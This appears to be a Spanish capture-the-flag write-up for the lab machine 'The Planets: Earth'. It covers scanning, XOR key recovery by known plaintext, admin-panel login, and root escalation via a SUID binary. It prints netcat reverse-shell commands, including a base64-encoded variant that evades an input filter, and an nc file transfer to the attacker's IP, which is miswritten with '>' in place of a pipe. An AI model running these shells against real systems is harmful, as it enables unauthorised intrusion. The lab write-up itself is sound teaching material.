# The planets: Earth

## Datos iniciales

IP atacante: 10.0.5.43
IP Victima: 10.0.6.13

## Servicios

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

## Versiones

```
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
```

Si analizamos el servidor web en detalle:

```
443/tcp unfiltered https
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
MAC Address: 08:00:27:CB:DA:3C (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linksys WRT610Nv3 WAP (91%), Linux 2.6.39 (91%), Citrix Access Gateway VPN gateway (90%), Linux 2.6.11 (90%), Linux 2.6.18 (90%), Linux 2.6.18.8 (openSUSE 10.2) (90%), Linux 2.6.18.8 (openSUSE 10.2, SMP) (90%), Linux 2.6.20.6 (90%), Linux 2.6.23 (90%), VMware ESX Server 3.0.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
```

Encontramos dos subdominios: `earth.local` y `terratest.earth.local`. Ambos apuntan a la misma IP.

Configuramos estos subdominios en nuestro archivo `/etc/hosts`.

## Servidor web

Al acceder a `earth.local` vemos una página web con un mensaje de bienvenida, un formulario para enviar mensajes a la Tierra encriptados y varios mensajes ya enviados:

```
37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

Hay contenido en `/robots.txt`:

```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

Entramos en `/testingnotes.txt` y encontramos:

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

Entramos en `/testdata.txt` y encontramos:

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Por lo que vemos, estan usando un algoritmo de cifrado XOR para enviar mensajes a la Tierra. Encontramos un archivo de prueba `/testdata.txt` que es el mensaje que estan usando para probar el cifrado.

En la página podemos ver el resultado de haber pasado `testdata.txt` por el algoritmo de cifrado XOR.

XOR es vulnerable a un ataque de texto plano conocido. Si conocemos el texto plano y el texto cifrado, podemos recuperar la clave.

Ejemplo:

Texto: "hola mundo"
Clave: 1234
Cifrado: 7a5b7e553259675a765b

Si introducimos como input "hola mundo" y como clave obtenemos "1234", el resultado es "7a5b7e553259675a765b".

En este caso podemos poner el texto encontrado y la version encriptada que encontramos en la pagina principal para obtener:

```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

De aqui podemos deducir que la clave usada es `earthclimatechangebad4humans`

## fuzzing web

Usaremos ffuf para fuzzear la web y encontrar posibles rutas ocultas.

```
└─$ ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://terratest.earth.local/FUZZ/ -c -v

[Status: 200, Size: 306, Words: 22, Lines: 16, Duration: 945ms]
| URL | http://terratest.earth.local/admin/
    * FUZZ: admin

[Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 0ms]
| URL | http://terratest.earth.local/cgi-bin/
    * FUZZ: cgi-bin

[Status: 200, Size: 74416, Words: 7420, Lines: 1007, Duration: 11ms]
| URL | http://terratest.earth.local/icons/
    * FUZZ: icons
```

Si entramos a `/admin/` encontramos un panel de administración. Podemos loguearnos con el usuario `terra` y la clave que encontramos anteriormente.

Aqui podemos lanzar comandos directamente a la máquina.

Podemos obtener una shell inversa con:

```
nc -e /bin/bash <ip> <puerto>
```

Sin embargo, no funciona, el servidor esta filtrando las ips en los strings de entrada.

Si encodeamos el comando con base64, podemos ejecutarlo sin problemas.

```
echo 'nc -e /bin/bash 10.0.12.25 1234' | base64
```
Esto nos devolvera una cadena en b64, si ejecutamos lo siguiente en el panel de admin:

```
echo 'bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMTIuMjUgMTIzNAo=' | base64 -d | bash
```

Obtendremos una shell inversa en nuestra máquina.

## Escalada de privilegios

Podemos usar `find / -perm -u=s -type f 2>/dev/null` para encontrar archivos con permisos de setuid. Estos archivos pueden ser ejecutados con los permisos del dueño del archivo.

Encontramos `/usr/bin/reset_root`, un archivo que podemos ejecutar con permisos de root.

Sin embargo al intentar ejecutarlo nos dice que no tenemos todos los triggers configurados. Es decir, necesitamos crear varios archivos o directorios antes de poder ejecutarlo.

Podemos intentar leer el archivo en busca de pistas con `strings /usr/bin/reset_root`, pero el archivo es demasiado grande.

Si usamos `ltrace /usr/bin/reset_root` desde la maquina victima vemos que no tenemos ltrace instalado, debemos enviarnoslo por nc a nuestra maquina:

En la maquina que recibe el archivo:

```
nc -lvpn 8888 > reset_root
```

En la maquina victima

```
cat /usr/bin/reset_root > nc 10.0.12.25 8888
```

Lo descargamos, vemos con ltrace que faltan los siguientes archivos:

```
access("/dev/shm/kHgTFI5G", 0)        = -1
access("/dev/shm/Zw7bV9U5", 0)        = -1
access("/tmp/kcM0Wewe", 0)            = -1
```

Los creamos con:

```
mkdir /dev/shm/kHgTFI5G
mkdir /dev/shm/Zw7bV9U5
mkdir "/tmp/kcM0Wewe"
```

Ejecutamos `reset_root` y vemos que la contraseña se ha reseteado a `Earth`.

Podemos entrar con `su root`, aunque deberás ejecutar:

```bash
script /dev/null -c bash
# pulsamos ctrl+z
stty raw -echo; fg
reset xterm 
export SHELL=bash
export TERM=xterm
```

Para trabajar con una terminal que no de asco.